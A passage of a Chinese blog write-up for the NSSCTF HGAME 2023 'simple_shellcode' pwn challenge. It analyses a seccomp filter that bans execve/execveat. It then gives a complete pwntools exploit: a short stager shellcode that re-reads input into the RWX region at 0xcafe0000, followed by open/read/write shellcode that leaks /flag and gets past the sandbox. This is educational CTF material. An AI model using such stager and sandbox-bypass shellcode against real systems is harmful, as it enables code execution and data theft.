+<li><p><strong>RET ALLOW</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; code=0x06, jt=0, jf=0, k=0x7FFF0000 &#125; // SECCOMP_RET_ALLOW</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>上述两条件都不满足（不是 execve&#x2F;execveat）→ 允许该系统调用。</p>
+</blockquote>
+</li>
+<li><p><strong>RET KILL</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123; code=0x06, jt=0, jf=0, k=0x00000000 &#125; // SECCOMP_RET_KILL (KILL_PROCESS)</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>命中第2或第3条跳转来到这里 → 直接杀掉进程。</p>
+</blockquote>
+</li>
+</ol>
+<p>这也就说明了，本题不允许使用的系统调用：</p>
+<ul>
+<li><code>execve</code> </li>
+<li><code>execveat</code></li>
+</ul>
+<p>当然，这一部分的分析也可以交给 AI 来快速处理：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/simple_shellcode/image-20251103094712059.png" alt="img"></p>
+<p>沙盒之后，就出现一个关键点：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000013B0 018 48 8B 55 F8                   mov     rdx, [rbp+buf]</span><br><span class="line">.text:00000000000013B4 018 B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:00000000000013B9 018 FF D2                         call    rdx</span><br></pre></td></tr></table></figure>
+
+<p>还记得我们一开始看到的 mmap 开辟的虚拟内存空间吗，那块的首地址就存在在 <code>[rbp+buf]</code> 当中，依据：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000134C 018 B8 00 00 FE CA                mov     eax, 0CAFE0000h</span><br><span class="line">.text:0000000000001351 018 48 89 45 F8                   mov     [rbp+buf], rax</span><br></pre></td></tr></table></figure>
+
+<p>那么，如果我们能向地址 <code>0xcafe0000</code> 写入 shellcode，然后通过 call 一调用，就可以获取到 flag 了。</p>
+<h2 id="四、思路汇总"><a href="#四、思路汇总" class="headerlink" title="四、思路汇总"></a>四、思路汇总</h2><p>首先，我们整理一下有用的信息：</p>
+<ul>
+<li>有一块可读可写可执行的虚拟内存，并且能向其中写入 0x10B 的数据；</li>
+<li>有 <code>call</code> 指令；</li>
+<li>存在沙盒，不允许使用 <code>execve</code> 和 <code>execveat</code>。</li>
+</ul>
+<p>这么一联系，我们就可以知道本题的难点在于：</p>
+<ol>
+<li>shellcode 的长度被限制；</li>
+<li>沙盒保护。</li>
+</ol>
+<p>因此，我们的思路就是，先写入较短的 shellcode 实现再次写入且将写入的长度限制给放开，然后再写入较长的 shellcode 来获取 flag 且该 shellcode 需要符合沙盒要求。</p>
+<h2 id="五、Poc-构造"><a href="#五、Poc-构造" class="headerlink" title="五、Poc 构造"></a>五、Poc 构造</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;./vuln_patched&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.DEBUG:</span><br><span class="line">            gdb.attach(r)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="number">25836</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    p = conn()</span><br><span class="line"></span><br><span class="line">    shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov rdi, rax;</span></span><br><span class="line"><span class="string">    mov rsi, rdx;</span></span><br><span class="line"><span class="string">    add rsi, 0x10;</span></span><br><span class="line"><span class="string">    syscall;</span></span><br><span class="line"><span class="string">    call rsi;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Please input your shellcode:&#x27;</span>,shellcode)</span><br><span class="line">    </span><br><span class="line">    shellcode = asm(shellcraft.<span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>)+shellcraft.read(<span class="number">3</span>,<span class="number">0xcafe0010</span>,<span class="number">0x50</span>)+shellcraft.write(<span class="number">1</span>,<span class="number">0xcafe0010</span>,<span class="number">0x50</span>))</span><br><span class="line"></span><br><span class="line">    p.send(shellcode)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>一步步分析，我们对第一次 shellcode 的要求就两个：</p>
+<ul>
+<li>简短</li>
+<li>实现再次写入</li>
+</ul>
+<p>程序已经非常贴心地为我们准备了两行指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000000013B0 018 48 8B 55 F8                   mov     rdx, [rbp+buf]</span><br><span class="line">.text:00000000000013B4 018 B8 00 00 00 00                mov     eax, 0</span><br></pre></td></tr></table></figure>
+
+<p>eax 中已经存放了 read 系统调用的系统调用号，rdx 中已经存放了我们要写入的位置即 <code>0xcafe0000</code>。</p>
+<p>因此，为了实现再次 read，我们只需要：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rdi, rax;</span><br><span class="line">mov rsi, rdx;</span><br><span class="line">add rsi, 0x10;</span><br><span class="line">syscall;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里还将写入位置进行了“加 <code>0x10</code>”的操作，是为了保护本轮的 shellcode不被后续的 shellcode 破坏。</p>
+</blockquote>
+<p>可是，写入完成之后，我们就已经用完了 <code>call</code> 指令，那么后续还需要执行新的 shellcode 怎么做到呢？</p>
+<p>没错，就像构造 ROP 一样，我们再后面跟上一条：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call rsi;</span><br></pre></td></tr></table></figure>
+
+<p>此时 rsi 中存放的依旧是地址 <code>0xcafe0000</code>，但是其中的内容已经通过第二次 read 修改成新的 shellcode 了。</p>
+<p>我们可以检查一下 shellcode 的长度，我跑出来是 14，刚好满足小于 16。</p>
+<p>后续，我们为了避免被沙盒过滤，采用 ORW 的方式来绕过。</p>
+<p>当然，也可以直接使用：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode = asm(shellcraft.cat(<span class="string">&quot;/flag&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>来替换，因为 <code>shellcraft.cat(&quot;/flag&quot;)</code> 生成的 shellcode 使用的是“Open + Sendfile”的组合，也不会被沙盒过滤。</p>
+<p>最终本地执行效果：</p>
+<p><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/simple_shellcode/image-20251103110240978.png" alt="img"></p>
+<p>成功拿到 flag。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://beini-faxianl.github.io">youdiscovered1t</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://beini-faxianl.github.io/2025/11/03/NSSCTF-HGAME-2023-week1-simple-shellcode/">https://beini-faxianl.github.io/2025/11/03/NSSCTF-HGAME-2023-week1-simple-shellcode/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://beini-faxianl.github.io" target="_blank">A Secret Site</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ORW/">ORW</a><a class="post-meta__tags" href="/tags/sandbox/">sandbox</a><a class="post-meta__tags" href="/tags/Shellcode/">Shellcode</a></div><div class="post-share"><div class="social-share" data-image="/img/author.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/1.png" target="_blank"><img class="post-qr-code-img" src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/1.png" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/2.png" target="_blank"><img class="post-qr-code-img" src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/2.png" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/08/BUUCTF-hitcontraining_uaf/" title="BUUCTF-hitcontraining_uaf"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">BUUCTF-hitcontraining_uaf</div></div><div class="info-2"><div class="info-item-1">一、题目来源BUUCTF-Pwn-hitcontraining_uaf 二、信息搜集通过 file 命令查看文件类型：  通过 checksec 命令查看文件使用的保护机制：  三、反汇编文件开始分析将题目给的二进制文件丢入 IDA Pro 当中开始反汇编。 程序的主要功能菜单函数已经写的很清楚了： int menu()&#123;  puts(&quot;----------------------&quot;);  puts(&quot;       HackNote       &quot;);  puts(&quot;----------------------&quot;);  puts(&quot; 1. Add note          &quot;);  puts(&quot; 2. Delete note       &quot;);  puts(&quot; 3. Print note        &quot;);  puts(&quot; 4. Exit              &quot;);  puts(&quot;----------------...</div></div></div></a><a class="pagination-related" href="/2025/10/25/%E8%B4%9D%E5%A1%94%E5%88%86%E5%B8%83/" title="贝塔分布"><img class="cover" src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/111.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">贝塔分布</div></div><div class="info-2"><div class="info-item-1">贝塔分布贝塔分布是一种连续概率分布，它描述了在一个固定区间内的随机变量的概率分布 贝塔分布由两个正数参数α(alpha)和β(beta)定义，这两个参数决定了分布的形状 它的概率密度函数 (PDF) 公式如下： $$f(x;\alpha, \beta) &#x3D; \frac{\Gamma(\alpha+\beta)}{\Gamma(\alpha)\Gamma(\beta)}x^{\alpha-1}(1-x)^{\beta-1}$$ 其中：x是一个介于0和1之间的随机变量 $\Gamma()$是伽马函数，根据其参数有两种不同的定义： $$\begin{cases}	\Gamma(n)&#x3D;(n-1)!\	\Gamma(z) &#x3D; \int_{0}^{\infty}t^{z-1}e^{-t}dt\end{cases}$$ 其中：  z为除去非正整数的整个复数域  n为正整数   主要性质与特征贝塔分布具有一些重要的统计特性：  期望：$E[x] &#x3D; \frac{\alpha}{\alpha+\beta}$   方差：$Var(x) &#x3D; \frac...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/author.png" onerror="this.onerror=null;this.src='/img/friend_404.png'" alt="avatar"/></div><div class="author-info-name">youdiscovered1t</div><div class="author-info-description">不以物喜，不以己悲。</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/beini-faxianl"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/beini-faxianl" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://blog.csdn.net/2301_76794844?type=blog" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="https://www.cnblogs.com/youdiscovered1t" target="_blank" title="博客园"><i class="fa fa-pen-nib"></i></a><a class="social-icon" href="/1436319009@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NSSCTF-HGAME-2023-week1-simple-shellcode"><span class="toc-text">NSSCTF-[HGAME 2023 week1]simple_shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90"><span class="toc-text">一、题目来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-text">二、信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8F%8D%E6%B1%87%E7%BC%96%E6%96%87%E4%BB%B6%E5%BC%80%E5%A7%8B%E5%88%86%E6%9E%90"><span class="toc-text">三、反汇编文件开始分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%80%9D%E8%B7%AF%E6%B1%87%E6%80%BB"><span class="toc-text">四、思路汇总</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81Poc-%E6%9E%84%E9%80%A0"><span class="toc-text">五、Poc 构造</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/08/BUUCTF-hitcontraining_uaf/" title="BUUCTF-hitcontraining_uaf">BUUCTF-hitcontraining_uaf</a><time datetime="2025-11-08T12:06:00.000Z" title="发表于 2025-11-08 20:06:00">2025-11-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/11/03/NSSCTF-HGAME-2023-week1-simple-shellcode/" title="NSSCTF-[HGAME 2023 week1]simple_shellcode">NSSCTF-[HGAME 2023 week1]simple_shellcode</a><time datetime="2025-11-03T03:10:00.000Z" title="发表于 2025-11-03 11:10:00">2025-11-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/25/%E8%B4%9D%E5%A1%94%E5%88%86%E5%B8%83/" title="贝塔分布"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/111.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="贝塔分布"/></a><div class="content"><a class="title" href="/2025/10/25/%E8%B4%9D%E5%A1%94%E5%88%86%E5%B8%83/" title="贝塔分布">贝塔分布</a><time datetime="2025-10-25T13:42:00.000Z" title="发表于 2025-10-25 21:42:00">2025-10-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/25/flag-market/" title="第九届强网杯线上赛Pwn_flag-market"><img src="https://s4.51cto.com/oss/202204/28/b919b00859fdad4e7d53212237723d3fe3d386.gif" data-original="/img/cover.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="第九届强网杯线上赛Pwn_flag-market"/></a><div class="content"><a class="title" href="/2025/10/25/flag-market/" title="第九届强网杯线上赛Pwn_flag-market">第九届强网杯线上赛Pwn_flag-market</a><time datetime="2025-10-25T13:05:00.000Z" title="发表于 2025-10-25 21:05:00">2025-10-25</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By youdiscovered1t</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.0.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.1</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.1"></script><script src="/js/main.js?v=5.5.1"></script><div class="js-pjax"><script>(() => {
+  const loadMathjax = () => {
+    if (!window.MathJax) {
+      window.MathJax = {
+        loader: {
+          load: [
+            // Four font extension packages (optional)
+            //- '[tex]/bbm',
+            //- '[tex]/bboldx',
+            //- '[tex]/dsfont',
+            '[tex]/mhchem'
+          ],
+          paths: {
+            'mathjax-newcm': '[mathjax]/../@mathjax/mathjax-newcm-font',
+
+            //- // Four font extension packages (optional)
+            //- 'mathjax-bbm-extension': '[mathjax]/../@mathjax/mathjax-bbm-font-extension',
+            //- 'mathjax-bboldx-extension': '[mathjax]/../@mathjax/mathjax-bboldx-font-extension',
+            //- 'mathjax-dsfont-extension': '[mathjax]/../@mathjax/mathjax-dsfont-font-extension',
+            'mathjax-mhchem-extension': '[mathjax]/../@mathjax/mathjax-mhchem-font-extension'
+          }
+        },
+        output: {
+          font: 'mathjax-newcm',
+        },
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']],
+          tags: 'none',
+          packages: {
+            '[+]': [
+              'mhchem'
+            ]
+          }
+        },
+        chtml: {
+          scale: 1.1
+        },
+        options: {
+          enableMenu: true,
+          menuOptions: {
+            settings: {
+              enrich: false  // Turn off Braille and voice narration text automatic generation
+            }
+          },
+          renderActions: {
+            findScript: [10, doc => {
+              for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+                const display = !!node.type.match(/; *mode=display/)
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+                const text = document.createTextNode('')
+                node.parentNode.replaceChild(text, node)
+                math.start = {node: text, delim: '', n: 0}
+                math.end = {node: text, delim: '', n: 0}
+                doc.math.push(math)
+              }
+            }, '']
+          }
+        }
+      }
+
+      const script = document.createElement('script')
+      script.src = 'https://cdn.jsdelivr.net/npm/mathjax@4.0.0/tex-mml-chtml.min.js'
+      script.id = 'MathJax-script'
+      script.async = true
+      document.head.appendChild(script)
+    } else {
+      MathJax.startup.document.state(0)
+      MathJax.texReset()
+      MathJax.typesetPromise()
+    }
+  }
+
+  btf.addGlobalFn('encrypt', loadMathjax, 'mathjax')
+  window.pjax ? loadMathjax() : window.addEventListener('load', loadMathjax)
+})()</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z\d\-\.\+]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(t.test(e.href)||r.test(e.href))&&(e.href=a.dataset.original)})});</script><script>(r=>{r.imageLazyLoadSetting.processImages=t;var a=r.imageLazyLoadSetting.isSPA,o=r.imageLazyLoadSetting.preloadRatio||1,d=i();function i(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(t){(a||t)&&(d=i());for(var e,n=0;n<d.length;n++)0<=(e=(e=d[n]).getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(r.innerHeight*o||document.documentElement.clientHeight*o)&&(()=>{var t,e,a,o,i=d[n];e=function(){d=d.filter(function(t){return i!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(i)},(t=i).dataset.loaded||(t.hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(a=new Image,o=t.getAttribute("data-original"),a.onload=function(){t.src=o,t.removeAttribute("data-original"),t.setAttribute("data-loaded",!0),e&&e()},a.onerror=function(){t.removeAttribute("data-original"),t.setAttribute("data-loaded",!1),t.src=o},t.src!==o&&(a.src=o)))})()}function e(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",e),r.addEventListener("resize",e),r.addEventListener("orientationchange",e)})(this);</script></body></html>
